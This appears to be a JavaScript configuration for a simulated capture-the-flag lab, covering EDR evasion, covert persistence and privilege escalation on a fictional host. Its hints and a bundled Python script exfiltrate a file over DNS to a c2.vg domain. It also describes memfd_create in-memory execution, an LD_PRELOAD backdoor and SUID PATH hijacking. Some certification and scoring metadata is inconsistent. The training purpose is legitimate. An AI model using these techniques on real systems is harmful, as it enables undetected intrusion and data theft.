/* ============================================================
   CTF ARENA — Box C9: The Silent Hunter
   Multi-Stage Campaign | EDR Bypass, Covert Persistence, Privilege Escalation, Covert Exfil
   Config: filesystem, EDR simulation, flags, hints, lore
   ============================================================ */

const C9Config = {

    // ═══════════════════════════════════════════════════════
    // BOX METADATA
    // ═══════════════════════════════════════════════════════

    title: 'The Silent Hunter',
    subtitle: 'Multi-Stage Campaign \u2014 EDR Bypass, Covert Persistence, Privilege Escalation, Data Exfiltration',
    difficulty: 'Expert',
    accent: '#8e44ad',
    storageKey: 'hexworth_ctf_c9',
    registryId: 'c9-silent-hunter',
    trackerKey: 'ctf_c9',

    // ═══════════════════════════════════════════════════════
    // PHASE SYSTEM (Multi-layer attack chain)
    // ═══════════════════════════════════════════════════════

    phases: [
        {
            id: 'recon',
            name: 'Initial Access & EDR Analysis',
            icon: '\uD83D\uDD0D',
            description: 'Regain your low-privilege shell on WKS-SENTINEL-01 as sentinel_dev. Enumerate the Cerberus EDR daemon and map its detection hooks before attempting anything offensive.',
            requiredFlags: [],
            mitre: ['T1059.004', 'T1518.001', 'T1082'],
            unlocks: ['edr_bypass'],
            locked: false
        },
        {
            id: 'edr_bypass',
            name: 'EDR Bypass',
            icon: '\uD83D\uDC7B',
            description: 'Defeat the Cerberus EDR path-execution monitor. Use memfd_create() to load and run your payload entirely in RAM, leaving no disk artifacts for the EDR to hook.',
            requiredFlags: [],
            mitre: ['T1620', 'T1055.009', 'T1027.011'],
            unlocks: ['persistence'],
            locked: true
        },
        {
            id: 'persistence',
            name: 'Covert Persistence',
            icon: '\uD83D\uDD11',
            description: 'Establish a stealthy foothold that survives reboots without triggering Cerberus file-write alerts. Plant an LD_PRELOAD backdoor inside a benign system service init script.',
            requiredFlags: ['edr_bypass'],
            mitre: ['T1574.006', 'T1037.004', 'T1564'],
            unlocks: ['privesc'],
            locked: true
        },
        {
            id: 'privesc',
            name: 'Covert Privilege Escalation',
            icon: '\uD83D\uDCC8',
            description: 'Escalate to root using a subtle SUID binary misconfiguration. The escalation path must avoid Cerberus auditd hooks on common sudo commands and ptrace syscalls.',
            requiredFlags: ['persistence'],
            mitre: ['T1548.001', 'T1068', 'T1055'],
            unlocks: ['exfiltration'],
            locked: true
        },
        {
            id: 'exfiltration',
            name: 'Undetectable Exfiltration',
            icon: '\uD83D\uDCC2',
            description: 'Retrieve the Vanguard Deployment Manifest from /root/deployment_manifest.txt. Exfiltrate it via DNS tunneling to evade Cerberus network monitors. Anti-forensics cleanup required.',
            requiredFlags: ['root'],
            mitre: ['T1048.003', 'T1071.004', 'T1070.004'],
            unlocks: [],
            locked: true
        }
    ],

    // ═══════════════════════════════════════════════════════
    // TUTORIAL MODE
    // ═══════════════════════════════════════════════════════

    tutorialMode: true,

    tutorial: {
        steps: [
            {
                title: 'Enumerate the Cerberus EDR daemon',
                tip: 'Run: ps aux | grep cerberus  and  cat /proc/$(pgrep cerberus)/maps  to identify what the EDR is watching. Check /var/log/cerberus/ for detection rule hints.',
                trigger: { event: 'command', match: { cmd: 'contains:cerberus' } }
            },
            {
                title: 'Bypass EDR with in-memory execution',
                tip: 'Use memfd_create() + execveat() to run payloads from anonymous RAM. Write a small C program: int fd = memfd_create(".", 0); write(fd, payload, len); execveat(fd, "", argv, envp, AT_EMPTY_PATH);',
                trigger: {
                    event: 'command',
                    match: { cmd: 'contains:memfd_create' },
                    alt: [
                        { event: 'command', match: { cmd: 'contains:execveat' } },
                        { event: 'flag_correct', match: { flagId: 'edr_bypass' } }
                    ]
                }
            },
            {
                title: 'Plant your LD_PRELOAD persistence mechanism',
                tip: 'Look for a writable init script the EDR ignores. Target /etc/init.d/rc.local or a custom service stub. Write a malicious shared lib to a non-standard path and inject it via LD_PRELOAD.',
                trigger: { event: 'flag_correct', match: { flagId: 'edr_bypass' } }
            },
            {
                title: 'Find the SUID misconfiguration and escalate',
                tip: 'Run: find / -perm -4000 -type f 2>/dev/null  to locate SUID binaries. Check custom Vanguard utilities \u2014 one may call a helper script with a PATH you control.',
                trigger: { event: 'flag_correct', match: { flagId: 'persistence' } }
            },
            {
                title: 'DNS-exfiltrate the deployment manifest',
                tip: 'Base64-encode the manifest and split into DNS label-sized chunks. Use: for chunk in $(base64 /root/deployment_manifest.txt | fold -w 60); do dig +short $chunk.exfil.c2.vg; done',
                trigger: { event: 'flag_correct', match: { flagId: 'root' } }
            }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // CERT OBJECTIVES (Assessment Mode)
    // ═══════════════════════════════════════════════════════

    certObjectives: {
        certPath: 'SY0-701',
        mappings: [
            { flagId: 'edr_bypass',  objective: '1.2', description: 'Given a scenario, analyze indicators of malicious activity \u2014 In-memory execution bypassing endpoint detection controls', skill: 'EDR Evasion via memfd_create' },
            { flagId: 'persistence', objective: '2.5', description: 'Given a scenario, explain the purpose of mitigation techniques \u2014 Covert persistence using LD_PRELOAD injection into system services', skill: 'Stealthy Persistence & Shared Library Injection' },
            { flagId: 'root',        objective: '1.4', description: 'Given a scenario, analyze potential indicators of network attacks \u2014 Covert privilege escalation avoiding auditd hooks', skill: 'SUID Exploitation & Kernel Hook Evasion' },
            { flagId: 'root',        objective: '4.3', description: 'Given a scenario, implement identity and account management controls \u2014 DNS tunneling for undetectable data exfiltration', skill: 'Covert Exfiltration & Anti-Forensics' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // BOOT SEQUENCE
    // ═══════════════════════════════════════════════════════

    boot: {
        biosLines: [
            'Kali Linux BIOS v4.2.1',
            'Initializing hardware...',
            'Memory Test: 32768 MB OK',
            'Detecting drives... /dev/sda1 (1TB NVMe SSD)',
            'PXE-E61: Media test failure, check cable',
            'PXE-M0F: Exiting PXE ROM.',
            'Boot device: /dev/sda1',
            'Loading GRUB...'
        ],
        grubEntries: [
            'Kali GNU/Linux',
            'Kali GNU/Linux (recovery mode)',
            'Advanced options for Kali GNU/Linux'
        ],
        loginUser: 'kali'
    },

    // ═══════════════════════════════════════════════════════
    // DESKTOP ICONS
    // ═══════════════════════════════════════════════════════

    desktop: {
        icons: [
            { id: 'terminal', label: 'Terminal',     icon: '\uD83D\uDDA5\uFE0F', app: 'terminal' },
            { id: 'browser',  label: 'Firefox',      icon: '\uD83C\uDF10',       app: 'browser'  },
            { id: 'notes',    label: 'Notes',         icon: '\uD83D\uDCDD',       app: 'notes'    },
            { id: 'hints',    label: 'Hints',         icon: '\uD83D\uDCA1',       app: 'hints'    },
            { id: 'flags',    label: 'Submit Flag',   icon: '\uD83D\uDEA9',       app: 'flags'    }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // TERMINAL CONFIG
    // ═══════════════════════════════════════════════════════

    terminal: {
        user: 'kali',
        hostname: 'kali',
        startDir: '/home/kali',
        welcome: 'Linux kali 6.1.0-kali9-amd64 #1 SMP\n\nType \'help\' for available commands.\nTarget: 10.20.5.47 (WKS-SENTINEL-01 \u2014 Vanguard Network)\nCerberus EDR v3.1 is active on target. Tread carefully.\n'
    },

    // ═══════════════════════════════════════════════════════
    // CONTEXT TRACKING (shell session state)
    // ═══════════════════════════════════════════════════════

    _context: 'attacker',           // 'attacker' | 'sentinel' | 'root'
    _edrBypassed: false,            // memfd_create payload successfully executed
    _persistenceInstalled: false,   // LD_PRELOAD backdoor planted
    _rootEscalated: false,          // SUID exploit achieved root
    _manifestExfiltrated: false,    // DNS exfil of deployment_manifest.txt complete
    _cerberusAlertsTriggered: 0,    // running count of EDR detections

    _switchContext(ctx, term) {
        C9Config._context = ctx;
        // Update terminal prompt to reflect current shell context
        if (term && term.config) {
            var prompt = C9Config._getPrompt();
            if (prompt) {
                term.config.user = prompt.split('@')[0] || 'kali';
                term.config.hostname = 'context';
                term._customPrompt = prompt;
            } else {
                term._customPrompt = null;
            }
        }
    },

    _getPrompt() {
        switch (C9Config._context) {
            case 'sentinel': return 'sentinel_dev@WKS-SENTINEL-01:~$ ';
            case 'root':     return 'root@WKS-SENTINEL-01:~# ';
            default:         return null; // use default kali prompt
        }
    },

    // ═══════════════════════════════════════════════════════
    // CERBERUS EDR RESPONSE ENGINE
    // Simulates alerting/killing behavior based on context.
    // Returns a string if the action should be "blocked",
    // or null if the action is clean.
    // ═══════════════════════════════════════════════════════

    _cerberusCheck(action, detail) {
        if (C9Config._edrBypassed) return null; // bypass is active — all clear

        // Blocked patterns before bypass
        const blocked = {
            'exec_tmp':    '[CERBERUS ALERT] Process execution from /tmp detected. PID terminated. (Rule: EXEC_WRITABLE_PATH)',
            'exec_devshm': '[CERBERUS ALERT] Process execution from /dev/shm detected. PID terminated. (Rule: EXEC_WRITABLE_PATH)',
            'ptrace':      '[CERBERUS ALERT] ptrace() syscall detected on target process. Operation blocked. (Rule: SYSCALL_PTRACE)',
            'sudo_common': '[CERBERUS ALERT] Suspicious sudo invocation detected. Command logged and blocked. (Rule: SUDO_MONITOR)',
            'suid_abuse':  '[CERBERUS ALERT] Unexpected SUID binary execution pattern detected. (Rule: SUID_ABUSE)',
            'mmap_exec':   '[CERBERUS ALERT] Anonymous executable mmap() region detected — possible shellcode injection. (Rule: MMAP_EXEC_ANON)',
            'net_suspect': '[CERBERUS ALERT] Outbound connection to non-whitelisted external IP detected. Connection reset. (Rule: NET_EGRESS_POLICY)',
            'passwd_write':'[CERBERUS ALERT] Write attempt to /etc/passwd detected. Operation denied. (Rule: SENSITIVE_FILE_WRITE)'
        };

        if (blocked[action]) {
            C9Config._cerberusAlertsTriggered++;
            return '\n\u26A0\uFE0F  ' + blocked[action] + '\n';
        }
        return null;
    },

    // ═══════════════════════════════════════════════════════
    // VANGUARD DEPLOYMENT MANIFEST (target data)
    // ═══════════════════════════════════════════════════════

    _manifest: {
        header: '=== VANGUARD DEPLOYMENT MANIFEST v4.7 ===\nCLASSIFICATION: TOP SECRET // VANGUARD-EYES-ONLY\nDate Generated: 2026-03-18 03:00:00 UTC\nAuthorizing Officer: Director Harlan Voss\n',
        assets: [
            { asset_id: 'VG-PROD-001', system: 'Prometheus Relay Node',     ip: '172.31.0.10', role: 'Primary C2 Relay',          status: 'ACTIVE',    key: 'sk_SIMULATED_prometheus_relay_7f2a9c1b4e3d' },
            { asset_id: 'VG-PROD-002', system: 'Athena Sensor Array',       ip: '172.31.0.22', role: 'Passive Recon Implant',     status: 'ACTIVE',    key: 'sk_SIMULATED_athena_sensor_8b3e1f5a2c9d'   },
            { asset_id: 'VG-PROD-003', system: 'Hades Data Store',          ip: '172.31.0.35', role: 'Encrypted Exfil Staging',   status: 'ACTIVE',    key: 'AKIA_SIMULATED_hades_datastore_4k7z'        },
            { asset_id: 'VG-PROD-004', system: 'Ares Strike Package',       ip: '172.31.0.48', role: 'Destructive Payload Host',  status: 'STANDBY',   key: 'sk_SIMULATED_ares_strike_2x8m3n1p'          },
            { asset_id: 'VG-PROD-005', system: 'CERBERUS-MASTER',           ip: '172.31.0.1',  role: 'EDR Orchestration Server', status: 'ACTIVE',    key: 'sk_SIMULATED_cerberus_master_9a4c7b2e'      },
            { asset_id: 'VG-EXFIL-01', system: 'EXFIL MARKER // FLAG',      ip: '0.0.0.0',     role: 'CLASSIFIED',               status: '{{FLAG:root}}', key: 'N/A' }
        ]
    },

    // ═══════════════════════════════════════════════════════
    // FLAGS
    // ═══════════════════════════════════════════════════════

    flags: [
        { id: 'edr_bypass',  points: 100 },
        { id: 'persistence', points: 200 },
        { id: 'root',        points: 300 }
    ],

    // ═══════════════════════════════════════════════════════
    // SCORING
    // ═══════════════════════════════════════════════════════

    scoring: {
        base: 2000,
        maxScore: 600,
        hintPenalty: true,
        wrongFlagPenalty: -25,
        speedBonus: { threshold: 2700000, points: 200 },  // 45 minutes
        timeBonusThreshold: 5400  // 90 min — bonus if completed under this
    },

    // ═══════════════════════════════════════════════════════
    // HINTS
    // ═══════════════════════════════════════════════════════

    hints: [
        {
            id: 'hint1',
            text: 'The Cerberus EDR blocks execution from writable paths (/tmp, /dev/shm) and monitors common syscalls. Start by reading /var/log/cerberus/rules.conf and running: cat /proc/$(pgrep cerberus_daemon)/maps — this reveals which syscalls it hooks.',
            cost: 10,
            penalty: -10
        },
        {
            id: 'hint2',
            text: 'To bypass path-based execution monitoring, use memfd_create() to allocate anonymous memory. Compile a small C stub: int fd = memfd_create("init", MFD_CLOEXEC); write payload bytes to fd, then execveat(fd, "", argv, envp, AT_EMPTY_PATH). The EDR cannot see a path because there is none.',
            cost: 25,
            penalty: -25
        },
        {
            id: 'hint3',
            text: 'For persistence, look at /etc/init.d/vanguard-health — it is a writable service stub that runs as root at boot. Modify it to set LD_PRELOAD=/lib/x86_64-linux-gnu/.cache/libaudit_hook.so before exec-ing crond. Place your malicious .so there. The EDR rule for this path is disabled (see rules.conf line 47).',
            cost: 50,
            penalty: -50
        },
        {
            id: 'hint4',
            text: 'Run: find / -perm -4000 -type f 2>/dev/null — look for /usr/local/bin/vg-status. It calls /usr/local/share/vanguard/check.sh via a relative helper path. Create a malicious check.sh earlier in PATH before execveat-ing vg-status to get a root callback.',
            cost: 75,
            penalty: -75
        },
        {
            id: 'hint5',
            text: 'DNS exfil: base64 /root/deployment_manifest.txt | tr -d "\\n" | fold -w 60 | while read chunk; do dig +short "${chunk}.x.c2.vg" @8.8.8.8; done — the simulated C2 tunnel command is: dns_exfil --file /root/deployment_manifest.txt --domain c2.vg',
            cost: 100,
            penalty: -100
        }
    ],

    // ═══════════════════════════════════════════════════════
    // LORE
    // ═══════════════════════════════════════════════════════

    lore: {
        intro: 'The "Cerberus Initiative," a highly advanced Endpoint Detection and Response (EDR) system, guards the most sensitive workstations within the "Vanguard Network." It boasts real-time behavioral analysis, signatureless detection, and rapid remediation capabilities. After an initial compromise of WKS-SENTINEL-01, your reverse shell was immediately detected and terminated, leaving no persistent access. Cerberus is formidable. Your mission, Peerless: return to WKS-SENTINEL-01 and become the Silent Hunter \u2014 operating entirely below the radar.',
        scenario: 'Vanguard is a signals-intelligence contractor that deploys sensor implants, relay nodes, and destructive payloads for state-level clients. Their crown jewel is the Vanguard Deployment Manifest \u2014 a classified document enumerating every active system and its credentials. It lives on WKS-SENTINEL-01, guarded by root permissions and the Cerberus EDR. You have low-privilege shell access as sentinel_dev. Every careless move will be detected, logged, and remediated. This time you must be invisible.',
        outro: 'The Vanguard Deployment Manifest is exfiltrated. Six production assets, including the Cerberus master controller, are now fully exposed. The network that prided itself on impenetrable endpoint defense was undone by a single writable service stub and a forgotten SUID binary. The Silent Hunter was never detected. Cerberus never barked.',
        ecer: {
            executive: 'Security budget allocated entirely to perimeter controls and EDR licensing; no red team exercises conducted against the EDR itself',
            culture: 'Engineers trusted that Cerberus covered all attack surface; no manual audit of service scripts or SUID binaries performed in 18 months',
            employee: 'Writable /etc/init.d/vanguard-health left with 0666 permissions after a maintenance window; custom SUID vg-status compiled without hardened PATH handling',
            regulatory: 'Classified data (Vanguard Deployment Manifest) stored on a workstation with a low-privilege user account; no need-to-know access controls enforced at filesystem level'
        }
    },

    // ═══════════════════════════════════════════════════════
    // WEB APP — Vanguard Internal Portal (reference only)
    // The attacker machine has a browser pointing to this
    // to review EDR documentation and Vanguard SOPs.
    // ═══════════════════════════════════════════════════════

    webApp: {
        startUrl: 'http://10.20.5.1/vanguard-portal/',

        pages: {
            '/vanguard-portal/': {
                title: 'Vanguard Network \u2014 Internal Portal',
                html: `
                    <div style="text-align:center; margin-bottom:28px; padding-bottom:20px; border-bottom:1px solid #ddd;">
                        <h1 style="color:#2c3e50; font-size:1.5rem; font-family:Georgia,serif; margin-bottom:4px;">Vanguard Network</h1>
                        <div style="color:#8e44ad; font-size:0.85rem; font-weight:700; letter-spacing:0.15em;">INTERNAL OPERATIONS PORTAL</div>
                        <div style="color:#888; font-size:0.72rem; margin-top:6px;">Authorized personnel only. All access logged by Cerberus Initiative v3.1.</div>
                    </div>

                    <div style="max-width:600px; margin:0 auto 20px; display:grid; grid-template-columns:1fr 1fr 1fr; gap:10px;">
                        <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#8e44ad;">6</div>
                            <div style="color:#888; font-size:0.68rem;">Active Assets</div>
                        </div>
                        <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#27ae60;">NOMINAL</div>
                            <div style="color:#888; font-size:0.68rem;">Cerberus Status</div>
                        </div>
                        <div style="background:#f8f9fa; border:1px solid #eee; border-radius:6px; padding:14px; text-align:center;">
                            <div style="font-size:1.3rem; font-weight:700; color:#2c3e50;">0</div>
                            <div style="color:#888; font-size:0.68rem;">Active Alerts</div>
                        </div>
                    </div>

                    <div style="max-width:600px; margin:0 auto; padding:12px; background:rgba(142,68,173,0.05); border:1px solid rgba(142,68,173,0.15); border-radius:4px; font-size:0.74rem; color:#888;">
                        <strong style="color:#8e44ad;">Security Notice:</strong> WKS-SENTINEL-01 Cerberus agent is active. EDR documentation available at <a href="/vanguard-portal/edr-docs/" style="color:#8e44ad;">/vanguard-portal/edr-docs/</a>.
                    </div>
                `,
                formHandler: null
            },
            '/vanguard-portal/edr-docs/': {
                title: 'Cerberus EDR \u2014 Technical Documentation',
                html: `
                    <div style="margin-bottom:20px;">
                        <h2 style="color:#2c3e50; font-size:1.15rem; margin-bottom:4px;">Cerberus Initiative v3.1 \u2014 Detection Rules Reference</h2>
                        <div style="color:#888; font-size:0.72rem;">Classification: INTERNAL USE ONLY</div>
                    </div>

                    <div style="font-family:monospace; font-size:0.78rem; background:#1a1a2e; color:#a9b7c6; padding:18px; border-radius:6px; line-height:1.7;">
                        <div style="color:#8e44ad; margin-bottom:10px;"># /var/log/cerberus/rules.conf (partial export)</div>
                        <div># == PATH-BASED EXECUTION RULES ==</div>
                        <div>RULE EXEC_WRITABLE_PATH : deny execve from { /tmp /dev/shm /run/user }</div>
                        <div>RULE EXEC_HOME_NOEXEC   : warn execve from /home/* if !signed</div>
                        <div style="margin-top:8px;"># == SYSCALL HOOKS ==</div>
                        <div>HOOK ptrace             : deny always</div>
                        <div>HOOK process_vm_writev  : deny always</div>
                        <div>HOOK mmap(PROT_EXEC|MAP_ANON) : alert + log</div>
                        <div style="margin-top:8px;"># == FILE INTEGRITY ==</div>
                        <div>MONITOR /etc/passwd /etc/shadow /etc/sudoers : deny write</div>
                        <div>MONITOR /etc/init.d/rc.local   : deny write</div>
                        <div style="color:#555; margin-top:8px;"># line 47 \u2014 legacy exclusion (do not remove without CAB approval)</div>
                        <div style="color:#555;">EXCLUDE /etc/init.d/vanguard-health : all_rules</div>
                        <div style="margin-top:8px;"># == NETWORK EGRESS ==</div>
                        <div>ALLOW egress : { 172.31.0.0/16 10.20.0.0/16 }</div>
                        <div>DENY  egress : 0.0.0.0/0 # default deny external</div>
                        <div>EXCEPT DNS   : port 53 allowed for { 8.8.8.8 1.1.1.1 }</div>
                        <div style="margin-top:8px;"># == SUDO MONITOR ==</div>
                        <div>RULE SUDO_MONITOR : alert on sudo execve if user != [ root ops-svc ]</div>
                    </div>

                    <div style="margin-top:14px; padding:10px; background:rgba(231,76,60,0.06); border:1px solid rgba(231,76,60,0.15); border-radius:4px; font-size:0.73rem; color:#888;">
                        <strong style="color:#e74c3c;">Red Team Advisory (2026-01-09):</strong> Rules audit identified that <code>/etc/init.d/vanguard-health</code> was added to the EXCLUDE list following the 2025-Q4 maintenance window. CAB ticket VG-2025-1147 to re-enable monitoring is <strong>pending approval</strong>.
                    </div>
                `,
                formHandler: null
            },
            '/vanguard-portal/assets/': {
                title: 'Vanguard Asset Registry \u2014 Restricted',
                html: `<div style="text-align:center; padding:40px;">
                    <h1 style="color:#e74c3c; font-size:2rem;">403 Forbidden</h1>
                    <p style="color:#888;">Asset registry requires VANGUARD-ADMIN role. Your session does not have sufficient privileges.</p>
                    <p style="color:#aaa; font-size:0.72rem;">Cerberus access attempt logged. Ref: CER-${Math.floor(Math.random()*90000)+10000}</p>
                </div>`,
                formHandler: null
            },
            '/vanguard-portal/wks-sentinel-01/': {
                title: 'WKS-SENTINEL-01 \u2014 Workstation Profile',
                html: `
                    <div style="margin-bottom:20px;">
                        <h2 style="color:#2c3e50; font-size:1.15rem; margin-bottom:4px;">WKS-SENTINEL-01 \u2014 Workstation Profile</h2>
                        <div style="color:#27ae60; font-size:0.75rem; font-weight:700;">STATUS: ONLINE \u2014 Cerberus agent active</div>
                    </div>
                    <div style="font-family:monospace; font-size:0.78rem; background:#f8f9fa; border:1px solid #eee; padding:14px; border-radius:6px; line-height:1.9;">
                        <div><strong>Hostname:</strong> WKS-SENTINEL-01</div>
                        <div><strong>IP:</strong> 10.20.5.47</div>
                        <div><strong>OS:</strong> Ubuntu 22.04.3 LTS (kernel 5.15.0-101-generic)</div>
                        <div><strong>CPU:</strong> Intel Xeon E-2334 (4c/8t)</div>
                        <div><strong>RAM:</strong> 32 GB ECC DDR4</div>
                        <div><strong>Disk:</strong> /dev/nvme0n1 (1TB NVMe) \u2014 encrypted (LUKS)</div>
                        <div><strong>Local Users:</strong> root, sentinel_dev, ops-svc, cerberus</div>
                        <div><strong>Cerberus Agent:</strong> v3.1.4 \u2014 last check-in 38s ago</div>
                        <div><strong>SUID Binaries:</strong> Standard set + /usr/local/bin/vg-status (custom)</div>
                        <div><strong>Last Patch:</strong> 2026-02-14 (kernel + glibc)</div>
                    </div>
                `,
                formHandler: null
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM (attacker machine — kali)
    // ═══════════════════════════════════════════════════════

    filesystem: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'kali': {
                            type: 'dir',
                            children: {
                                'mission_brief.txt': {
                                    type: 'file',
                                    content: '=== OPERATION: SILENT HUNTER ===\nTarget: 10.20.5.47 (WKS-SENTINEL-01 \u2014 Vanguard Network)\nUser: sentinel_dev (low-priv, initial access assumed)\n\nObjectives:\n  1. Enumerate and map Cerberus EDR detection rules\n  2. Bypass EDR via in-memory execution (no disk artifacts)\n  3. Establish stealthy LD_PRELOAD persistence (survives reboot)\n  4. Escalate to root via SUID misconfiguration (no EDR alerts)\n  5. Exfiltrate /root/deployment_manifest.txt via DNS tunnel\n  6. Anti-forensics cleanup\n\nNote: Cerberus has a known exclusion on /etc/init.d/vanguard-health.\nNote: Outbound DNS on port 53 is permitted to 8.8.8.8 and 1.1.1.1.\n\nGood hunting, Peerless.'
                                },
                                'memfd_loader.c': {
                                    type: 'file',
                                    content: '// memfd_create loader stub\n// Executes payload entirely in RAM \u2014 no disk artifact\n#define _GNU_SOURCE\n#include <sys/mman.h>\n#include <sys/syscall.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <string.h>\n\nint main(int argc, char **argv) {\n    // Create anonymous in-memory file\n    int fd = (int)syscall(SYS_memfd_create, "init", 1);\n    if (fd < 0) { perror("memfd_create"); return 1; }\n\n    // In real use: write payload bytes to fd here\n    // fwrite(payload, 1, payload_len, fdopen(fd, "w"));\n\n    // Execute from memory using execveat with AT_EMPTY_PATH\n    // syscall(SYS_execveat, fd, "", argv + 1, environ, AT_EMPTY_PATH);\n\n    return 0; // placeholder\n}'
                                },
                                'dns_exfil.py': {
                                    type: 'file',
                                    content: '#!/usr/bin/env python3\n# DNS Exfiltration script\n# Encodes file contents as DNS query labels\n# Sends chunks to C2 via permitted DNS egress (port 53)\n\nimport base64\nimport subprocess\nimport sys\nimport time\n\nDOMAIN = "c2.vg"\nDNS_SERVER = "8.8.8.8"\nCHUNK_SIZE = 60\n\ndef exfil(filepath):\n    with open(filepath, "rb") as f:\n        data = base64.b64encode(f.read()).decode()\n    chunks = [data[i:i+CHUNK_SIZE] for i in range(0, len(data), CHUNK_SIZE)]\n    for i, chunk in enumerate(chunks):\n        label = f"{chunk}.{i}.exfil.{DOMAIN}"\n        subprocess.run(["dig", "+short", label, f"@{DNS_SERVER}"],\n                       capture_output=True)\n        time.sleep(0.05)  # rate limit to avoid pattern detection\n    print(f"[+] Exfiltrated {len(chunks)} DNS chunks.")\n\nif __name__ == "__main__":\n    if len(sys.argv) < 2:\n        print("Usage: dns_exfil.py <file>")\n        sys.exit(1)\n    exfil(sys.argv[1])'
                                },
                                '.bash_history': {
                                    type: 'file',
                                    content: 'ssh sentinel_dev@10.20.5.47\nnmap -sV 10.20.5.47\ncurl http://10.20.5.1/vanguard-portal/edr-docs/\ngcc -o memfd_loader memfd_loader.c'
                                }
                            }
                        }
                    }
                },
                'usr': {
                    type: 'dir',
                    children: {
                        'share': {
                            type: 'dir',
                            children: {
                                'wordlists': {
                                    type: 'dir',
                                    children: {
                                        'rockyou.txt': { type: 'file', content: '[rockyou.txt \u2014 14,341,564 passwords \u2014 file too large to display]' }
                                    }
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'kali' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nkali:x:1000:1000:Kali,,,:/home/kali:/bin/bash'
                        }
                    }
                },
                'tmp': { type: 'dir', children: {} }
            }
        }
    },

    // ═══════════════════════════════════════════════════════
    // FILESYSTEM — WKS-SENTINEL-01 (after SSH as sentinel_dev)
    // ═══════════════════════════════════════════════════════

    _sentinelFs: {
        '/': {
            type: 'dir',
            children: {
                'home': {
                    type: 'dir',
                    children: {
                        'sentinel_dev': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'id\nuname -a\nps aux\ncat /proc/1/maps\nls /etc/init.d/\nls -la /usr/local/bin/\nfind / -perm -4000 -type f 2>/dev/null\ncat /var/log/cerberus/cerberus.log\ncd /tmp && gcc test.c -o test && ./test'
                                },
                                '.bashrc': {
                                    type: 'file',
                                    content: '# ~/.bashrc\nexport PS1="\\u@\\h:\\w\\$ "\nexport PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nalias ll="ls -la"\nalias grep="grep --color=auto"'
                                },
                                'notes.txt': {
                                    type: 'file',
                                    content: 'TODO:\n- Ask IT to fix /etc/init.d/vanguard-health permissions (still 0666 from Jan maintenance)\n- Cerberus seems to have an exclusion on that script per the portal docs\n- /usr/local/bin/vg-status has SUID bit \u2014 need to verify with ops-svc\n- Deployment manifest is in /root/ but I don\'t have clearance to read it'
                                }
                            }
                        },
                        'ops-svc': {
                            type: 'dir',
                            children: {
                                '.bash_history': {
                                    type: 'file',
                                    content: 'sudo systemctl status cerberus\nvg-status --report\ncat /root/deployment_manifest.txt\nsystemctl restart vanguard-health'
                                }
                            }
                        }
                    }
                },
                'etc': {
                    type: 'dir',
                    children: {
                        'hostname': { type: 'file', content: 'WKS-SENTINEL-01' },
                        'passwd': {
                            type: 'file',
                            content: 'root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\ncerberus:x:999:999:Cerberus EDR Service:/var/lib/cerberus:/bin/false\nops-svc:x:500:500:Vanguard Ops Service:/home/ops-svc:/bin/bash\nsentinel_dev:x:1001:1001:Sentinel Developer:/home/sentinel_dev:/bin/bash'
                        },
                        'shadow': {
                            type: 'file',
                            content: 'cat: /etc/shadow: Permission denied'
                        },
                        'sudoers': {
                            type: 'file',
                            content: 'cat: /etc/sudoers: Permission denied'
                        },
                        'init.d': {
                            type: 'dir',
                            children: {
                                'rc.local': {
                                    type: 'file',
                                    content: '#!/bin/sh\n# rc.local\n# Monitored by Cerberus (RULE: SENSITIVE_FILE_WRITE)\n# This file is executed at the end of each multiuser runlevel.\nexit 0'
                                },
                                'vanguard-health': {
                                    type: 'file',
                                    // 0666 permissions — writable by sentinel_dev
                                    // EDR EXCLUDE rule applies (see edr-docs)
                                    content: '#!/bin/sh\n# vanguard-health \u2014 Vanguard Network health monitoring stub\n# Installed: 2025-12-01 | Last modified: 2026-01-14 by ops-svc\n# NOTE: Cerberus exclusion active (CAB VG-2025-1147 pending)\n#\n# TODO: Re-enable EDR monitoring after CAB approval\n\ncase "$1" in\n  start)\n    logger "vanguard-health: starting"\n    exec /usr/sbin/crond -f\n    ;;\n  stop)\n    logger "vanguard-health: stopping"\n    kill $(cat /var/run/crond.pid 2>/dev/null)\n    ;;\n  *)\n    echo "Usage: $0 {start|stop}"\n    exit 1\nesac'
                                }
                            }
                        }
                    }
                },
                'var': {
                    type: 'dir',
                    children: {
                        'log': {
                            type: 'dir',
                            children: {
                                'cerberus': {
                                    type: 'dir',
                                    children: {
                                        'cerberus.log': {
                                            type: 'file',
                                            content: '2026-03-18 02:47:11 [ALERT] EXEC_WRITABLE_PATH: pid=8823 comm=sh path=/tmp/test uid=1001\n2026-03-18 02:47:11 [ACTION] PID 8823 SIGKILL sent\n2026-03-18 02:47:39 [ALERT] EXEC_WRITABLE_PATH: pid=8891 comm=gcc-output path=/tmp/ uid=1001\n2026-03-18 02:47:39 [ACTION] PID 8891 SIGKILL sent\n2026-03-18 02:48:02 [INFO] Syscall hook active: ptrace mmap_exec process_vm_writev\n2026-03-18 02:48:02 [INFO] File integrity monitor active: /etc/passwd /etc/shadow /etc/sudoers /etc/init.d/rc.local\n2026-03-18 02:48:02 [INFO] EXCLUDE active: /etc/init.d/vanguard-health (ref: VG-2025-1147)\n2026-03-18 02:48:02 [INFO] Egress policy: DENY 0.0.0.0/0 EXCEPT port 53 -> 8.8.8.8 1.1.1.1\n2026-03-18 03:19:44 [INFO] Agent heartbeat OK (cerberus-master 172.31.0.1)'
                                        },
                                        'rules.conf': {
                                            type: 'file',
